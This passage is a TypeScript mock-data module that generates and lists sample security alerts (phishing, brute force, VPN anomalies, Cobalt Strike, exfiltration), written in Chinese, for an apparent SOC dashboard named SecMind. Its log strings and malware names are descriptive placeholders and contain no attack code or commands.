import type {
  User, Alert, DashboardStats, Device, ITSMTicket, AIAnalysis,
  VPNSession, EmailLog, LoginAttempt, AlertType, RiskLevel, AlertStatus,
} from '@/types'

// Seed-based data pools for deterministic generation
const USER_NAMES = ['张伟', '李娜', '王芳', '陈刚', '刘洋', '赵敏', '孙浩', '周静', '吴强', '郑丽', '冯涛', '褚琳', '卫东', '蒋华', '沈雪', '韩超', '杨帆', '朱婷', '秦明', '许佳', '吕峰', '施蕾', '张磊', '钱进', '吴涛', '黄强', '赵磊', '孙丽', '周敏', '林峰', '何欣', '马骏', '高远', '罗薇', '谢勇']
const POSITIONS = ['高级工程师','架构师','安全分析师','安全工程师','运维工程师','前端工程师','后端工程师','测试工程师','DevOps工程师','DBA','产品经理','市场总监','HRBP','SRE工程师','渗透测试工程师','SOC分析师','数据分析师','算法工程师','网络工程师']
const OFFICES = ['北京','上海','深圳','杭州','广州']
const RISK_LEVELS: RiskLevel[] = ['critical', 'high', 'medium', 'low', 'info']
const ALERT_STATUSES: AlertStatus[] = ['new', 'investigating', 'resolved', 'false_positive', 'escalated']
const ATTACK_IPS = [
  '103.45.67.89', '185.220.101.34', '91.234.56.78', '45.33.32.156', '198.51.100.23',
  '203.0.113.50', '45.67.89.12', '185.220.101.35', '103.45.67.90', '58.216.33.12',
  '103.45.67.91', '185.220.101.36', '45.33.32.100', '198.51.100.45', '45.33.32.101',
  '198.51.100.50', '45.33.32.102', '198.51.100.55', '103.45.67.92', '185.220.101.37',
  '41.58.67.89', '77.88.44.33', '149.154.167.220', '104.16.0.1', '140.82.121.6',
]
const SEED_INTERNAL_IPS = [
  '10.0.1.55', '10.0.0.1', '10.0.2.100', '10.0.1.10', '10.0.4.22', '10.0.3.45',
  '10.0.2.50', '10.0.1.60', '10.0.1.35', '10.0.5.10', '10.0.2.88', '10.0.4.10',
  '10.0.4.15', '10.0.3.60', '10.0.2.60', '10.0.0.5', '10.0.1.20', '10.0.1.25',
  '10.0.1.15', '10.0.1.30', '10.0.3.70',
]
const SEED_TAGS_POOL = [
  ['钓鱼攻击', '凭证窃取'], ['暴力破解', 'Tor出口节点'], ['VPN异常', '不可能旅行'],
  ['恶意软件', 'APT'], ['C2通信', 'DNS隧道'], ['横向移动', '内网渗透'],
  ['数据外泄', '源代码'], ['权限提升', '漏洞利用'], ['恶意软件', 'Emotet'],
  ['钓鱼攻击', 'BEC'], ['暴力破解', '撞库'], ['VPN异常', '离职员工'],
  ['数据外泄', 'DLP'], ['恶意软件', '勒索病毒'], ['C2通信', 'Beacon'],
  ['横向移动', 'WMI'], ['恶意软件', '挖矿木马'], ['C2通信', 'IRC'],
  ['权限提升', '数据库'], ['恶意软件', 'RAT'], ['C2通信', 'HTTPS'],
  ['权限提升', 'Kubernetes'], ['横向移动', 'SSH密钥'], ['数据外泄', 'DNS'],
  ['C2通信', 'GitHub'], ['钓鱼攻击', '电子发票'], ['暴力破解', 'Jenkins'],
  ['VPN异常', '多设备'], ['暴力破解', 'IMAP'], ['数据外泄', '云盘'],
  ['权限提升', 'sudo'], ['横向移动', 'RDP'], ['数据外泄', '打印'],
  ['C2通信', 'Telegram'], ['C2通信', 'Cloudflare'], ['权限提升', 'AWS'],
  ['钓鱼攻击', '供应商'], ['暴力破解', 'Redis'], ['恶意软件', '供应链攻击'],
  ['VPN异常', '代理链路'], ['钓鱼攻击', '高仿域名'], ['暴力破解', 'SSH'],
  ['VPN异常', '异常地区'], ['数据外泄', 'USB'], ['钓鱼攻击', '快递通知'],
  ['VPN异常', '长时间连接'], ['VPN异常', '非常规时间'], ['VPN异常', '频繁断连'],
  ['钓鱼攻击', '银行钓鱼'], ['暴力破解', 'WordPress'],
]
const TITLE_TEMPLATES: Record<AlertType, string[]> = {
  phishing: ['钓鱼邮件攻击 - {details}', '钓鱼邮件 - {details}', 'BEC攻击 - {details}'],
  brute_force: ['暴力破解攻击 - {details}', '暴力破解 - {details}', '撞库攻击 - {details}'],
  vpn_anomaly: ['VPN异常登录 - {details}', 'VPN异常 - {details}'],
  malware: ['恶意软件检测 - {details}', '恶意软件 - {details}', 'WebShell检测 - {details}'],
  data_exfiltration: ['数据外泄 - {details}', '数据外泄检测 - {details}'],
  privilege_escalation: ['权限提升 - {details}', '权限提升检测 - {details}'],
  lateral_movement: ['横向移动 - {details}', '横向移动检测 - {details}'],
  c2_communication: ['C2通信检测 - {details}', 'C2通信 - {details}'],
}
const PHISHING_DETAILS = ['高仿OA系统登录页', '冒充IT部门密码重置', '伪造发票附件', '冒充CEO紧急转账', '虚假快递通知', '伪造HR福利通知', '海关缴税通知', '供应商对账单', '银行账户异常', '电子发票查询', '云存储共享通知', '视频会议邀请', '社交媒体消息', '订阅续费通知', '安全警告通知', '税务申报提醒', '域名过期通知', 'Office365验证', 'AppleID锁定', 'DHL投递通知']
const BRUTE_FORCE_DETAILS = ['VPN网关登录尝试', 'SSH暴力破解跳板机', 'RDP远程桌面攻击', 'OA系统密码猜测', '邮件系统登录尝试', 'WordPress后台攻击', 'Redis未授权访问', 'Jenkins凭证猜测', 'GitLab密码爆破', '数据库端口扫描', 'API接口Fuzz', 'SMB协议探测', 'FTP匿名登录', 'Tomcat管理口', 'Elasticsearch扫描', 'Memcached探测', 'MongoDB扫描', 'Kubernetes API探测', 'RabbitMQ探测', 'NFS端口扫描']
const VPN_DETAILS = ['不可能旅行检测', '异常地区登录', '已离职员工登录', '多设备同时在线', '长时间连接未断开', '非常规时间登录', '代理链路检测', '频繁断连重连', '多地同时在线', '异常协议连接', '新设备首次登录', '境外IP连接', 'Tor节点连接', '公共WiFi登录', '虚拟机内登录']
const MALWARE_DETAILS = ['Cobalt Strike Beacon', 'Emotet木马', 'NJRat远控木马', '挖矿木马', '勒索病毒变种', '间谍软件', '键盘记录器', '后门程序', 'Rootkit检测', '引导区病毒', 'WebShell后门', '宏病毒', '蠕虫病毒', 'Infostealer窃密木马', 'Raccoon Stealer', 'FormBook木马', 'AgentTesla', 'RedLine窃密', 'AsyncRAT', 'QuasarRAT']
const DATA_EXFIL_DETAILS = ['源代码外传到境外', '身份证通过DLP', '财务报表外发个人邮箱', 'USB拷贝敏感文件', '异常DNS隧道传输', '云盘上传项目代码', '打印机大量打印文档', 'FTP批量文件上传', '数据库导出CSV文件', 'ImAP下载全部邮件', 'GitLab仓库Clone', 'Confluence批量下载', 'JIRA工单导出', 'S3存储桶下载', 'OSS文件批量迁移']
const PRIV_ESC_DETAILS = ['管理员权限获取', '异常sudo操作', '数据库管理员授权', 'K8s RBAC异常', 'AWS IAM提权', '本地提权漏洞利用', '域管理员账户获取', '服务账户权限提升', 'Docker逃逸', '容器权限提升', 'Windows Token窃取', 'Kerberoasting攻击', 'DCSync攻击', 'ACL滥用', '组策略修改']
const LATERAL_DETAILS = ['PTH攻击横向移动', 'WMI远程执行', 'PsExec远程命令', 'SSH密钥滥用', 'RDP横向扩散', 'SMB远程复制', 'WinRM远程管理', 'SCP文件传输', '定时任务远程触发', 'DCOM远程调用', '计划任务创建', '远程注册表修改', 'WMI事件订阅', '网络共享文件复制', '远程桌面文件共享']
const C2_DETAILS = ['DNS隧道通信', 'HTTPS Beacon', 'IRC协议外联', 'Telegram Bot API', 'GitHub Issues通道', 'Cloudflare Workers', 'WebSocket隧道', 'ICMP隧道', 'HTTP隐蔽通道', 'SSH反向隧道', 'TOR隐蔽服务', 'DNS-over-HTTPS隧道', 'Amazon CloudFront', 'Azure CDN通道', 'Google Cloud Functions']

function seededRandom(seed: number): () => number {
  let s = seed
  return () => {
    s = (s * 16807 + 0) % 2147483647
    return s / 2147483647
  }
}

function sPick<T>(arr: T[], rand: () => number): T {
  return arr[Math.floor(rand() * arr.length)]
}

function formatTime(date: Date): string {
  return date.toISOString().replace('Z', 'Z')
}

function generateSeededAlert(id: string, rand: () => number, baseDate: Date): Alert {
  const type = sPick(ALERT_TYPES, rand)
  const riskLevel = sPick(RISK_LEVELS, rand)
  const status = sPick(ALERT_STATUSES, rand)
  const source = sPick(SOURCES, rand)
  const sourceIp = sPick(ATTACK_IPS, rand)
  const destIp = sPick(SEED_INTERNAL_IPS, rand)
  const userIdx = Math.floor(rand() * USER_NAMES.length)
  const userName = USER_NAMES[userIdx]
  const userId = `U${String(userIdx + 1).padStart(3, '0')}`
  const tags = [...sPick(SEED_TAGS_POOL, rand)]

  let details = ''
  switch (type) {
    case 'phishing': details = sPick(PHISHING_DETAILS, rand); break
    case 'brute_force': details = sPick(BRUTE_FORCE_DETAILS, rand); break
    case 'vpn_anomaly': details = sPick(VPN_DETAILS, rand); break
    case 'malware': details = sPick(MALWARE_DETAILS, rand); break
    case 'data_exfiltration': details = sPick(DATA_EXFIL_DETAILS, rand); break
    case 'privilege_escalation': details = sPick(PRIV_ESC_DETAILS, rand); break
    case 'lateral_movement': details = sPick(LATERAL_DETAILS, rand); break
    case 'c2_communication': details = sPick(C2_DETAILS, rand); break
  }

  const titleTemplate = sPick(TITLE_TEMPLATES[type], rand)
  const title = titleTemplate.replace('{details}', details)
  const hoursOffset = -Math.floor(rand() * 720)
  const timestamp = new Date(baseDate.getTime() + hoursOffset * 3600000 + Math.floor(rand() * 3600) * 1000)
  const ts = formatTime(timestamp)

  const aiScore = Math.floor(rand() * 60) + 25

  return {
    id,
    type,
    title,
    description: `SecMind平台自动检测到${details}，来源IP ${sourceIp}，目标 ${destIp}，已触发${source}告警。`,
    riskLevel,
    status,
    source,
    sourceIp,
    destinationIp: destIp,
    userId,
    userName,
    timestamp: ts,
    rawLog: `SRC=${sourceIp} DST=${destIp} TYPE=${type} ALERT=${id}`,
    tags,
    aiScore,
    aiSummary: `AI分析：检测到${details}，风险评分${aiScore}，来源${source}`,
    aiRecommendation: '建议确认后根据标准操作流程处理。',
    relatedAlerts: [],
  }
}

/* ========= Generator Helper Pools ========= */

const DEPARTMENTS = ['技术部','财务部','人事部','研发部','市场部','安全部','运维部','产品部','数据部','法务部']

const DEPT_USERS: { userId: string; userName: string; department: string }[] = [
  { userId: 'U001', userName: '张伟', department: '中国' },
  { userId: 'U002', userName: '李娜', department: '中国' },
  { userId: 'U003', userName: '王芳', department: '中国' },
  { userId: 'U004', userName: '陈刚', department: '中国' },
  { userId: 'U005', userName: '刘洋', department: '中国' },
  { userId: 'U006', userName: '赵敏', department: '中国' },
  { userId: 'U007', userName: '孙浩', department: '中国' },
  { userId: 'U008', userName: '周静', department: '中国' },
  { userId: 'U009', userName: '吴强', department: '中国' },
  { userId: 'U010', userName: '郑丽', department: '中国' },
  { userId: 'U011', userName: '冯涛', department: '中国' },
  { userId: 'U012', userName: '褚琳', department: '中国' },
  { userId: 'U013', userName: '卫东', department: '中国' },
  { userId: 'U014', userName: '蒋华', department: '中国' },
  { userId: 'U015', userName: '沈雪', department: '中国' },
  { userId: 'U016', userName: '韩超', department: '中国' },
  { userId: 'U017', userName: '杨帆', department: '中国' },
  { userId: 'U018', userName: '朱婷', department: '中国' },
  { userId: 'U019', userName: '秦明', department: '中国' },
  { userId: 'U020', userName: '许佳', department: '中国' },
  { userId: 'U021', userName: '吕峰', department: '中国' },
  { userId: 'U022', userName: '施蕾', department: '中国' },
  { userId: 'U023', userName: '张磊', department: '中国' },
  { userId: 'U024', userName: '钱进', department: '中国' },
  { userId: 'U025', userName: '吴涛', department: '中国' },
  { userId: 'U026', userName: '黄强', department: '中国' },
  { userId: 'U027', userName: '赵磊', department: '中国' },
  { userId: 'U028', userName: '孙丽', department: '中国' },
  { userId: 'U029', userName: '周敏', department: '中国' },
  { userId: 'U030', userName: '林峰', department: '中国' },
  { userId: 'U031', userName: '何欣', department: '中国' },
  { userId: 'U032', userName: '马骏', department: '中国' },
  { userId: 'U033', userName: '高远', department: '中国' },
  { userId: 'U034', userName: '罗薇', department: '中国' },
  { userId: 'U035', userName: '谢勇', department: '中国' },
]

const CITIES = ['北京','上海','深圳','广州','杭州','成都','南京','武汉','西安','重庆','天津','苏州','长沙','郑州','东莞','青岛','沈阳','宁波','昆明','大连']
const OVERSEAS_CITIES = ['新加坡','东京','首尔','曼谷','伦敦','巴黎','柏林','莫斯科','迪拜','纽约','洛杉矶','旧金山','悉尼','多伦多','班加罗尔','雅加达','拉各斯']
const ALL_LOCATIONS = [...CITIES, ...OVERSEAS_CITIES]

const PUBLIC_IPS = ['103.45.67.','185.220.101.','198.51.100.','203.0.113.','45.33.32.','41.58.67.','58.216.33.','114.88.23.','123.120.88.','172.16.45.','91.234.56.','77.88.44.','149.154.167.','104.16.0.','140.82.121.','62.210.34.','51.15.78.','163.172.90.','54.38.45.','195.154.123.']
const INTERNAL_IPS = ['10.0.1.','10.0.2.','10.0.3.','10.0.4.','10.0.5.','10.0.10.','10.0.20.','172.16.0.','172.16.1.','192.168.1.']
const SOURCES = ['邮件网关','VPN网关','EDR','SIEM','防火墙','DLP','WAF','NAC','堡垒机','HIDS']

const ALERT_TYPES: AlertType[] = ['phishing','brute_force','vpn_anomaly','malware','c2_communication','lateral_movement','data_exfiltration','privilege_escalation']

const USER_AGENTS = ['Windows 10 - Chrome','Windows 11 - Chrome','MacBook Pro - Safari','MacBook Air - Safari','iPhone - Safari','Android - Chrome','Windows 10 - Edge','MacBook Pro - Chrome','Linux - Firefox','iPad - Safari','Windows 11 - Firefox','Windows Server 2022 - RDP']

const AI_AGENTS = ['威胁分析Agent','暴力破解分析Agent','VPN异常分析Agent','APT分析Agent','数据外泄分析Agent','钓鱼分析Agent','恶意软件分析Agent','横向移动分析Agent','权限分析Agent','C2分析Agent','云安全分析Agent','供应链分析Agent','网络分析Agent','终端分析Agent','行为分析Agent']

const ASSIGNEES = ['赵敏','卫东','秦明','马骏','吕峰','杨帆','冯涛','蒋华','张伟','钱进']

/* ========= Generator Utilities ========= */

function pick<T>(arr: T[]): T { return arr[Math.floor(Math.random() * arr.length)] }

function randInt(min: number, max: number): number { return Math.floor(Math.random() * (max - min + 1)) + min }

function randomDate(startDaysAgo: number, endDaysAgo: number): Date {
  const now = new Date('2026-05-18T23:59:59Z')
  const start = now.getTime() - startDaysAgo * 86400000
  const end = now.getTime() - endDaysAgo * 86400000
  return new Date(start + Math.random() * (end - start))
}

function formatISO(d: Date): string { return d.toISOString() }

function generateIP(prefix: string): string { return prefix + randInt(1, 254) }

/* ========= Alert Generators ========= */

/* ========= Static Hand-Crafted Alerts (ALT001-ALT055) ========= */

const staticAlerts: Alert[] = [
  { id: 'ALT001', type: 'phishing', title: '钓鱼邮件攻击 - 高仿OA系统登录页', description: '检测到针对财务部员工的钓鱼邮件，邮件伪装为OA系统升级通知，引导用户点击恶意链接输入凭证。发件人地址高仿内部域名，链接指向境外服务器。', riskLevel: 'critical', status: 'escalated', source: '邮件网关', sourceIp: '103.45.67.89', destinationIp: '10.0.1.55', userId: 'U002', userName: '李娜', timestamp: '2026-05-09T08:23:15Z', rawLog: 'SRC=103.45.67.89 DST=10.0.1.55 PROTO=SMTP MSG="Phishing email detected - OA login spoof"', tags: ['钓鱼攻击', '凭证窃取', '财务部'], aiScore: 92, aiSummary: '高度确认为针对性钓鱼攻击，攻击者使用高仿域名secm1nd.com冒充secmind.com', aiRecommendation: '立即隔离用户邮箱，重置密码，检查是否有凭证泄露', relatedAlerts: ['ALT008', 'ALT015', 'ALT022'], timeline: [{ id: 'TL001', timestamp: '2026-05-09T08:23:15Z', type: 'alert', title: '钓鱼邮件触发告警', description: '邮件网关检测到钓鱼邮件', source: '邮件网关' }, { id: 'TL002', timestamp: '2026-05-09T08:25:30Z', type: 'ai_analysis', title: 'AI分析完成', description: 'AI确认钓鱼攻击，风险评分92', source: 'AI引擎' }, { id: 'TL003', timestamp: '2026-05-09T08:30:00Z', type: 'action', title: '告警升级', description: '安全分析师将告警升级为严重', source: '赵敏' }] },
  { id: 'ALT002', type: 'brute_force', title: 'VPN暴力破解攻击', description: '检测到针对VPN网关的暴力破解攻击，5分钟内来自同一IP的登录失败尝试超过200次，使用常见用户名字典。', riskLevel: 'critical', status: 'investigating', source: 'VPN网关', sourceIp: '185.220.101.34', destinationIp: '10.0.0.1', userId: 'U004', userName: '陈刚', timestamp: '2026-05-09T03:15:22Z', rawLog: 'SRC=185.220.101.34 DST=10.0.0.1 PROTO=UDP ACTION=LOGIN_FAIL COUNT=200+', tags: ['暴力破解', 'VPN', 'Tor出口节点'], aiScore: 88, aiSummary: '来源IP为Tor出口节点，高度疑似自动化攻击工具', aiRecommendation: '封禁来源IP段，启用MFA强制验证，检查相关账户', relatedAlerts: ['ALT009', 'ALT016'], timeline: [{ id: 'TL004', timestamp: '2026-05-09T03:15:22Z', type: 'alert', title: '暴力破解告警触发', description: 'VPN网关检测到大量登录失败', source: 'VPN网关' }] },
  { id: 'ALT003', type: 'vpn_anomaly', title: 'VPN异常登录 - 不可能旅行', description: '用户王芳在短时间内从北京和莫斯科两地登录VPN，物理距离超过5000公里，时间间隔仅2小时，判定为不可能旅行。', riskLevel: 'high', status: 'investigating', source: 'VPN网关', sourceIp: '91.234.56.78', destinationIp: '10.0.0.1', userId: 'U003', userName: '王芳', timestamp: '2026-05-09T06:45:10Z', rawLog: 'USER=wangfang SRC=91.234.56.78 LOC=Moscow,RU PREV_LOC=Beijing,CN TIME_DIFF=7200s', tags: ['VPN异常', '不可能旅行', '凭证泄露'], aiScore: 85, aiSummary: '不可能旅行告警，账户可能已被盗用，莫斯科登录疑似攻击者', aiRecommendation: '立即冻结账户，联系用户确认，检查近期操作记录', relatedAlerts: ['ALT010', 'ALT055'], timeline: [{ id: 'TL005', timestamp: '2026-05-09T06:45:10Z', type: 'alert', title: '不可能旅行告警', description: '检测到用户从莫斯科异常登录', source: 'VPN网关' }] },
  { id: 'ALT004', type: 'malware', title: '终端恶意软件检测 - Cobalt Strike', description: '研发部工程师陈刚的工作站检测到Cobalt Strike Beacon通信，疑似APT攻击。进程svchost.exe异常外联，内存中检测到shellcode特征。', riskLevel: 'critical', status: 'escalated', source: 'EDR', sourceIp: '10.0.2.100', destinationIp: '45.33.32.156', userId: 'U004', userName: '陈刚', timestamp: '2026-05-08T22:10:33Z', rawLog: 'HOST=DEV-WS-004 PROC=svchost.exe SIG=CS_Beacon DST=45.33.32.156:443', tags: ['恶意软件', 'Cobalt Strike', 'APT'], aiScore: 97, aiSummary: '高度确认APT攻击，Cobalt Strike Beacon已建立C2通道', aiRecommendation: '立即隔离主机，提取内存镜像，检查横向移动痕迹', relatedAlerts: ['ALT005', 'ALT006', 'ALT011'], timeline: [{ id: 'TL006', timestamp: '2026-05-08T22:10:33Z', type: 'alert', title: '恶意软件告警', description: 'EDR检测到Cobalt Strike Beacon', source: 'EDR' }] },
  { id: 'ALT005', type: 'c2_communication', title: 'C2通信检测 - 异常DNS隧道', description: '检测到DNS隧道通信，域名格式为随机子域.xcdn.xyz，与已知C2基础设施关联。通信频率每30秒一次，数据量异常。', riskLevel: 'critical', status: 'investigating', source: 'SIEM', sourceIp: '10.0.2.100', destinationIp: '45.33.32.156', userId: 'U004', userName: '陈刚', timestamp: '2026-05-08T22:15:00Z', rawLog: 'DNS_QUERY=a3f8b2.xcdn.xyz SRC=10.0.2.100 FREQ=30s SIZE=anomalous', tags: ['C2通信', 'DNS隧道', 'APT'], aiScore: 95, aiSummary: 'DNS隧道与Cobalt Strike攻击链一致，为同一APT攻击', aiRecommendation: '封禁相关域名，检查DNS日志中的其他受影响主机', relatedAlerts: ['ALT004', 'ALT006'], timeline: [{ id: 'TL007', timestamp: '2026-05-08T22:15:00Z', type: 'alert', title: 'C2通信告警', description: 'SIEM关联分析检测到DNS隧道', source: 'SIEM' }] },
  { id: 'ALT006', type: 'lateral_movement', title: '横向移动 - Pass-the-Hash攻击', description: '检测到从陈刚工作站向内网服务器发起的Pass-the-Hash攻击，使用NTLM哈希进行认证，已成功访问文件服务器和代码仓库。', riskLevel: 'critical', status: 'escalated', source: 'SIEM', sourceIp: '10.0.2.100', destinationIp: '10.0.1.10', userId: 'U004', userName: '陈刚', timestamp: '2026-05-08T23:30:00Z', rawLog: 'SRC=10.0.2.100 DST=10.0.1.10 AUTH=NTLM_PTH USER=chengang', tags: ['横向移动', 'PTH', '内网渗透'], aiScore: 96, aiSummary: '攻击者已通过PTH获取内网访问权限，访问了敏感代码仓库', aiRecommendation: '重置所有相关账户密码，检查代码仓库是否被篡改', relatedAlerts: ['ALT004', 'ALT005', 'ALT007'], timeline: [{ id: 'TL008', timestamp: '2026-05-08T23:30:00Z', type: 'alert', title: '横向移动告警', description: '检测到PTH攻击', source: 'SIEM' }] },
  { id: 'ALT007', type: 'data_exfiltration', title: '数据外泄 - 大量代码仓库数据外传', description: '检测到从代码仓库服务器向境外IP的大量数据传输，总计约2.3GB，传输使用HTTPS加密，目标IP与C2服务器同一网段。', riskLevel: 'critical', status: 'escalated', source: '防火墙', sourceIp: '10.0.1.10', destinationIp: '45.33.32.200', userId: 'U004', userName: '陈刚', timestamp: '2026-05-09T01:20:00Z', rawLog: 'SRC=10.0.1.10 DST=45.33.32.200 SIZE=2.3GB PROTO=HTTPS DURATION=45min', tags: ['数据外泄', '源代码', 'APT'], aiScore: 99, aiSummary: '确认数据外泄，攻击者已将核心代码仓库数据传输至C2基础设施', aiRecommendation: '立即阻断外联，启动应急响应，评估数据泄露范围', relatedAlerts: ['ALT004', 'ALT005', 'ALT006'], timeline: [{ id: 'TL009', timestamp: '2026-05-09T01:20:00Z', type: 'alert', title: '数据外泄告警', description: '防火墙检测到大量数据外传', source: '防火墙' }] },
  { id: 'ALT008', type: 'phishing', title: '钓鱼邮件 - 冒充IT部门密码重置', description: '检测到冒充IT部门的钓鱼邮件，要求用户点击链接重置密码。邮件模板高度仿真，包含公司Logo和签名。', riskLevel: 'high', status: 'resolved', source: '邮件网关', sourceIp: '172.16.45.90', destinationIp: '10.0.1.55', userId: 'U010', userName: '郑丽', timestamp: '2026-05-09T09:15:00Z', rawLog: 'SRC=it-support@secm1nd.com DST=zhengli@secmind.com SUBJECT="密码重置通知"', tags: ['钓鱼攻击', '密码重置', '高仿域名'], aiScore: 78, aiSummary: '钓鱼邮件使用高仿域名secm1nd.com，与ALT001同一攻击者', aiRecommendation: '已自动隔离，检查是否有其他员工收到类似邮件', relatedAlerts: ['ALT001'], timeline: [{ id: 'TL010', timestamp: '2026-05-09T09:15:00Z', type: 'alert', title: '钓鱼邮件告警', description: '邮件网关检测到钓鱼邮件', source: '邮件网关' }] },
  { id: 'ALT009', type: 'brute_force', title: 'SSH暴力破解 - 针对跳板机', description: '检测到针对跳板机的SSH暴力破解，来自境外IP，使用root及常见用户名字典攻击。', riskLevel: 'high', status: 'resolved', source: '防火墙', sourceIp: '185.220.101.35', destinationIp: '10.0.0.5', userId: 'U011', userName: '冯涛', timestamp: '2026-05-08T14:22:10Z', rawLog: 'SRC=185.220.101.35 DST=10.0.0.5 PROTO=TCP DPT=22 FAIL_COUNT=150', tags: ['暴力破解', 'SSH', '跳板机'], aiScore: 75, aiSummary: 'SSH暴力破解攻击，来源为Tor节点，与ALT002同一攻击者', aiRecommendation: '封禁IP，确认跳板机安全配置', relatedAlerts: ['ALT002'], timeline: [{ id: 'TL011', timestamp: '2026-05-08T14:22:10Z', type: 'alert', title: 'SSH暴力破解告警', description: '防火墙检测到SSH暴力破解', source: '防火墙' }] },
  { id: 'ALT010', type: 'vpn_anomaly', title: 'VPN异常登录 - 尼日利亚', description: '市场部刘洋从尼日利亚拉各斯登录VPN，该用户常驻广州，且无出差记录。登录时间为凌晨3点，行为异常。', riskLevel: 'high', status: 'investigating', source: 'VPN网关', sourceIp: '41.58.67.89', destinationIp: '10.0.0.1', userId: 'U005', userName: '刘洋', timestamp: '2026-05-09T03:00:00Z', rawLog: 'USER=liuyang SRC=41.58.67.89 LOC=Lagos,NG TIME=0300 PREV_LOC=Guangzhou,CN', tags: ['VPN异常', '异常地区', '凭证泄露'], aiScore: 82, aiSummary: '用户从尼日利亚异常登录，账户可能已被盗用', aiRecommendation: '冻结账户，联系用户确认，检查近期操作', relatedAlerts: ['ALT015', 'ALT022'], timeline: [{ id: 'TL012', timestamp: '2026-05-09T03:00:00Z', type: 'alert', title: 'VPN异常告警', description: '检测到从尼日利亚的异常VPN登录', source: 'VPN网关' }] },
  { id: 'ALT011', type: 'privilege_escalation', title: '权限提升 - 异常管理员权限获取', description: '陈刚的工作站上检测到从普通用户权限提升至管理员权限的操作，使用漏洞利用工具MS16-016。', riskLevel: 'critical', status: 'escalated', source: 'EDR', sourceIp: '10.0.2.100', destinationIp: '10.0.2.100', userId: 'U004', userName: '陈刚', timestamp: '2026-05-08T21:45:00Z', rawLog: 'HOST=DEV-WS-004 PRIV_ESC=Standard->Admin EXPLOIT=MS16-016', tags: ['权限提升', '漏洞利用', 'APT'], aiScore: 94, aiSummary: '权限提升为APT攻击链一环，与Cobalt Strike攻击关联', aiRecommendation: '检查系统补丁状态，隔离受影响主机', relatedAlerts: ['ALT004', 'ALT005', 'ALT006'], timeline: [{ id: 'TL013', timestamp: '2026-05-08T21:45:00Z', type: 'alert', title: '权限提升告警', description: 'EDR检测到权限提升操作', source: 'EDR' }] },
  { id: 'ALT012', type: 'phishing', title: '钓鱼邮件 - 伪造发票附件', description: '检测到包含恶意宏代码的Excel发票附件，邮件伪装为供应商发票。宏代码执行后将下载第二阶段payload。', riskLevel: 'high', status: 'investigating', source: '邮件网关', sourceIp: '198.51.100.23', destinationIp: '10.0.1.55', userId: 'U018', userName: '朱婷', timestamp: '2026-05-08T10:30:00Z', rawLog: 'SRC=invoice@suppl1er.com DST=zhuting@secmind.com ATTACH="发票_202605.xlsx" MACRO=enabled', tags: ['钓鱼攻击', '恶意附件', '宏病毒'], aiScore: 80, aiSummary: '恶意Excel附件包含宏代码，将下载后续payload', aiRecommendation: '隔离邮件，检查收件人是否打开了附件', relatedAlerts: [], timeline: [{ id: 'TL014', timestamp: '2026-05-08T10:30:00Z', type: 'alert', title: '钓鱼邮件告警', description: '邮件网关检测到恶意附件', source: '邮件网关' }] },
  { id: 'ALT013', type: 'brute_force', title: 'RDP暴力破解 - 针对财务服务器', description: '检测到针对财务服务器的RDP暴力破解攻击，来自内网已失陷主机。', riskLevel: 'critical', status: 'escalated', source: 'SIEM', sourceIp: '10.0.2.100', destinationIp: '10.0.1.20', userId: 'U002', userName: '李娜', timestamp: '2026-05-09T02:15:00Z', rawLog: 'SRC=10.0.2.100 DST=10.0.1.20 PROTO=TCP DPT=3389 FAIL_COUNT=50', tags: ['暴力破解', 'RDP', '财务服务器', '内网攻击'], aiScore: 90, aiSummary: '从已失陷主机发起的内网RDP暴力破解，为APT横向移动', aiRecommendation: '阻断内网RDP访问，检查财务服务器安全', relatedAlerts: ['ALT004', 'ALT006'], timeline: [{ id: 'TL015', timestamp: '2026-05-09T02:15:00Z', type: 'alert', title: 'RDP暴力破解告警', description: 'SIEM检测到内网RDP暴力破解', source: 'SIEM' }] },
  { id: 'ALT014', type: 'malware', title: '恶意软件 - Emotet木马', description: '人事部工作站检测到Emotet木马，通过钓鱼邮件中的恶意链接下载安装。木马具有键盘记录和凭证窃取功能。', riskLevel: 'high', status: 'investigating', source: 'EDR', sourceIp: '10.0.3.45', destinationIp: '203.0.113.50', userId: 'U022', userName: '施蕾', timestamp: '2026-05-08T16:40:00Z', rawLog: 'HOST=HR-WS-022 MALWARE=Emotet C2=203.0.113.50', tags: ['恶意软件', 'Emotet', '凭证窃取'], aiScore: 83, aiSummary: 'Emotet木马已建立C2通信，可能已窃取用户凭证', aiRecommendation: '隔离主机，重置用户凭证，检查是否有横向移动', relatedAlerts: [], timeline: [{ id: 'TL016', timestamp: '2026-05-08T16:40:00Z', type: 'alert', title: '恶意软件告警', description: 'EDR检测到Emotet木马', source: 'EDR' }] },
  { id: 'ALT015', type: 'phishing', title: '钓鱼邮件 - 冒充CEO紧急转账', description: '检测到冒充CEO黄强的钓鱼邮件，要求财务部紧急转账至境外账户。邮件语气紧迫，要求保密处理。', riskLevel: 'critical', status: 'escalated', source: '邮件网关', sourceIp: '45.67.89.12', destinationIp: '10.0.1.55', userId: 'U002', userName: '李娜', timestamp: '2026-05-09T07:30:00Z', rawLog: 'SRC=huang.qiang@secm1nd.com DST=lina@secmind.com SUBJECT="紧急转账-保密"', tags: ['钓鱼攻击', 'BEC', 'CEO欺诈'], aiScore: 91, aiSummary: 'BEC攻击，冒充CEO要求紧急转账，属于商业邮件欺诈', aiRecommendation: '立即通知财务部停止转账，确认CEO未发送此邮件', relatedAlerts: ['ALT001', 'ALT008'], timeline: [{ id: 'TL017', timestamp: '2026-05-09T07:30:00Z', type: 'alert', title: 'BEC攻击告警', description: '邮件网关检测到CEO冒充邮件', source: '邮件网关' }] },
  { id: 'ALT016', type: 'brute_force', title: '暴力破解 - 针对OA系统', description: '检测到针对OA系统的大量登录尝试，使用泄露的凭证列表进行撞库攻击。', riskLevel: 'medium', status: 'resolved', source: 'SIEM', sourceIp: '103.45.67.90', destinationIp: '10.0.1.55', userId: 'U009', userName: '吴强', timestamp: '2026-05-07T11:20:00Z', rawLog: 'SRC=103.45.67.90 DST=10.0.1.55 APP=OA FAIL_COUNT=80 CREDENTIAL_STUFFING=true', tags: ['暴力破解', '撞库', 'OA系统'], aiScore: 65, aiSummary: '撞库攻击使用泄露凭证列表，部分账户可能已失陷', aiRecommendation: '强制受影响用户重置密码，启用MFA', relatedAlerts: ['ALT002'], timeline: [{ id: 'TL018', timestamp: '2026-05-07T11:20:00Z', type: 'alert', title: '撞库攻击告警', description: 'SIEM检测到OA系统撞库攻击', source: 'SIEM' }] },
